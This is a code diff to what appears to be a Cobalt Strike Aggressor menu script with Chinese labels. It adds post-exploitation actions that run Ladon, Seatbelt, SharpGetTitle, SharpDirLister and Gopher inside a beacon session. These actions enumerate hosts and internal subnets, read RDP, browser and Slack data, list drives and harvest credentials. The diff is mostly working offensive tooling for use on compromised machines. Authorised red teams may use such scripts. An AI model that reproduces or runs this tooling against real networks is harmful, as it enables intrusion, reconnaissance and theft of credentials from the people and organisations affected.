@@ -18,6 +18,7 @@ menu "信息收集" {
             drow_checkbox($dialog, "cmd", "查看cmd历史命令", "");
             drow_checkbox($dialog, "powershell", "查看powershell历史命令", "");
             drow_checkbox($dialog, "recenttest", "查看文件浏览历史", "");
+            drow_checkbox($dialog, "recent_ladon", "查看文件浏览历史-ladon", "");
             drow_checkbox($dialog, "smb", "查看SMB指向路径", "");
             drow_checkbox($dialog, "brief", "查看安装程序和版本信息", "");
             drow_checkbox($dialog, "hotfixid", "查看安装的补丁", "");
@@ -31,6 +32,7 @@ menu "信息收集" {
             drow_checkbox($dialog, "workstation", "查看开机时间", "");
             drow_checkbox($dialog, "startup", "查看启动项", "");
             drow_checkbox($dialog, "qwinsta", "查看在线用户", "");
+            drow_checkbox($dialog, "GetIP", "查看本机内网与外网IP", "");
             dbutton_action($dialog, "运行");
             dialog_show($dialog);
         }
@@ -117,6 +119,12 @@ sub recenttest{
     bshell($bid, "dir %APPDATA%\\Microsoft\\Windows\\Recent");
 }
 
+sub recent_ladon{
+    btask($bid, "#######################", "");
+    btask($bid, "##  查看文件浏览历史  ##", "");
+	btask($bid, "#######################", "");
+    bexecute_assembly($bid, script_resource("/script/Ladon.exe"), "Recent");
+}
 
 sub smb{
     btask($bid, "########################", "");
@@ -211,6 +219,12 @@ sub qwinsta{
     bshell($bid, "query user || qwinsta");
 }
 
+sub GetIP{
+    btask($bid, "##############################", "");
+    btask($bid, "##  查看本机内网IP与外网IP  ##", "");
+	btask($bid, "##############################", "");
+    bexecute_assembly($bid, script_resource("/script/Ladon.exe"), "GetIP");
+}
 
 
 ######################################################################################################################
@@ -361,9 +375,36 @@ sub domain_online{
     bshell($bid, "net view");
 }
 
+			item "资产探测" {
+			$bid = $1['@'];
+			$dialog = dialog("资产探测", %(ip => "192.168.1.0/24",bid => $bid), &zichanscan);
+			dialog_description($dialog, "OnlinePC-多协议探测存活主机;OnlineIP-扫描存活主机;OsScan-多协议识别操作系统;");
+			drow_combobox($dialog, "type", "type:", @("OnlinePC","OnlineIP","OSScan","Ping","WebScan","WhatCMS","DomainIP","SameWeb","UrlScan","HostIP","LdapScan","FtpScan"));
+			drow_text($dialog, "ip", "ip:  ");			
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub zichanscan {
+	$arg = join(' ',  @($3['ip'],$3['type']));
+	btask($bid, "###################################",  "");
+    btask($bid, "##  OnlinePC-多协议探测存活主机   ##", "");
+    btask($bid, "##  OnlineIP-扫描存活主机         ##", "");
+    btask($bid, "##  OsScan-多协议识别操作系统     ##", "");
+	btask($bid, "##  Ping-ICMP扫描存活主机         ##", "");
+    btask($bid, "##  WebScan-扫描Web信息/Http服务  ##", "");
+    btask($bid, "##  UrlScan-扫描C段站点URL域名    ##", "");
+    btask($bid, "##  SameWeb-扫描C段站点URL域名    ##", "");
+    btask($bid, "##  DomainIP-域名解析IP           ##", "");
+	btask($bid, "##  HostIP-主机名解析IP           ##", "");
+	btask($bid, "##  WhatCMS-扫描C段WEB以及CMS     ##", "");
+	btask($bid, "##  LdapScan-扫描LDAP服务器       ##", "");
+	btask($bid, "##  FtpScan-扫描FTP服务器         ##", "");
+	btask($bid, "###################################",  "");
+	bexecute_assembly($bid, script_resource("/script/Ladon.exe"), $arg);
+}
 
-
-			item "扫描web应用" {
+menu "扫描web应用" {
+			item "SharpWebScan" {
 			$bid = $1['@'];
 			$dialog = dialog("SharpWebScan", %(iptype => "-IP",ip => beacon_info($bid,"internal"),port => "80,8080,8001,1433",bid => $bid), &SharpWebScan);
 			dialog_description($dialog, "扫描web应用,返回web地址和title。");
@@ -376,6 +417,23 @@ sub domain_online{
 sub SharpWebScan {
 	$arg = join(' ', @($3['iptype'],$3['ip'],$3['port']));
 	bexecute_assembly($bid, script_resource("/script/SharpWebScan.exe"), $arg);
+}
+
+			item "SharpGetTitle" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpGetTitle", %(ip => "127.0.0.1||127.0.0.1/24",ports => "80-99,443,7001",thread => "100",outfile => "c:\\windows\\Temp\\123.txt",bid => $bid), &SharpGetTitle);
+			dialog_description($dialog, "扫描web应用,返回web地址和title,会在本地输出文件");
+			drow_text($dialog, "ip", "ip:  ");	
+			drow_text($dialog, "ports", "ports:  ");
+			drow_text($dialog, "thread", "thread:  ");
+			drow_text($dialog, "outfile", "outfile:  ");				
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+       }
+sub SharpGetTitle {
+	$arg = join(' ', @("-i",$3['ip'],"-p",$3['ports'],"-t",$3['thread'],"-o",$3['outfile'],"-v"));
+	bexecute_assembly($bid, script_resource("/script/SharpGetTitle.exe"), $arg);
+}
 }
 
     menu "查看mstsc记录"{
@@ -405,9 +463,13 @@ sub listlogs {
                 dbutton_action($Dialog, "运行");
                 dialog_show($Dialog);
             }
+				item "查看RDP记录-Ladon"{
+				bexecute_assembly($1, script_resource('/script/Ladon1.exe'), "RdpLog");
+            }
 				item "获取RDP与putty信息"{
 				bexecute_assembly($1, script_resource('/script/SessionSearcher.exe'), "");
             }
+
 }
 sub listlog {
 	local('$script');
@@ -422,6 +484,47 @@ sub listlog {
 
 }
 
+				item "一键获取主机信息"{
+				bexecute_assembly($1, script_resource('/script/Ladon.exe'), "GetInfo");
+            }
+			
+			
+menu "一键获取信息-Seatbelt" {
+			item "命令行返回结果" {
+			$bid = $1;
+			$dialog = dialog("一键获取信息-Seatbelt", %(Type => "all -full",bid => $bid), &Seatbelt);
+			dialog_description($dialog, "一键获取信息。");
+			drow_combobox($dialog, "Type", "Type:", @("all -full", "system -full","user -full","misc -full","Slack -full","Chrome -full","Remote -full"));
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub Seatbelt {
+
+		$arg = join('', @("-group=",$3['Type']));
+		bexecute_assembly($bid, script_resource("/script/Seatbelt.exe"), $arg);
+}
+
+			item "输出结果到txt" {
+			$bid = $1['@'];
+			$dialog = dialog("一键获取信息-Seatbelt", %(Type => "all -full",path => "C:\\windows\\Temp\\123.txt",bid => $bid), &Seatbelt_txt);
+			dialog_description($dialog, "一键获取信息,输出结果到txt。");
+			drow_text($dialog, "path", "path:  ");			
+			drow_combobox($dialog, "Type", "Type", @("all -full", "system -full","user -full","misc -full","Slack -full","Chrome -full","Remote -full"));
+            dbutton_action($dialog, "运行");
+			dialog_show($dialog);
+        }
+sub Seatbelt_txt {
+		bexecute_assembly($bid, script_resource("/script/Seatbelt.exe"), "-group=$3['Type'] -outputfile=\"$3['path']\"");
+
+		}
+		}
+			
+				item "获取凭证相关信息-Gopher"{
+				bexecute_assembly($1, script_resource('/script/Gopher.exe'), "");
+    	}
+				item "获取.net&&powershell版本"{
+				bexecute_assembly($1, script_resource('/script/Ladon.exe'), "NetVer");
+            }
 
 	        item "获取系统登录日志" {
 			$bid = $1;
@@ -434,6 +537,7 @@ sub listlog {
 sub SharpEventLog {
 	bexecute_assembly($bid, script_resource("/script/SharpEventLog.exe"), $3['EventLogType']);
 }
+
 
 			item "获取回收站等信息" {
 			$bid = $1;
@@ -484,9 +588,24 @@ sub SharpAVKB {
 	bexecute_assembly($bid, script_resource("/script/SharpAVKB.exe"), $3['type']);
 }
 
-		item "获取EDR信息" {
+			item "获取EDR信息" {
 			bexecute_assembly($1, script_resource("/script/SharpEDRChecker.exe"), "");
-		}	
+		}
+
+			item "获取文件目录结构"{
+				$bid = $1;
+				$dialog = dialog("SharpDirLister", %(filepath => "C:\\windows\\temp",outpath => "C:\\windows\\Temp",bid => $bid), &SharpDirLister);
+				dialog_description($dialog, "输出驱动器的完整目录/文件列表，最后将其压缩为.gz");
+				drow_text($dialog, "filepath", "目录路径:  ");	
+				drow_text($dialog, "outpath", "输出路径:  ");					
+				dbutton_action($dialog, "运行");
+				dialog_show($dialog);
+        }
+sub SharpDirLister {
+	$arg = join(' ', @($3['filepath'],$3['outpath']));
+	bexecute_assembly($bid, script_resource("/script/SharpDirLister.exe"), $arg);
+}
+
 		
 			item "文件搜索" {
 			$bid = $1['@'];
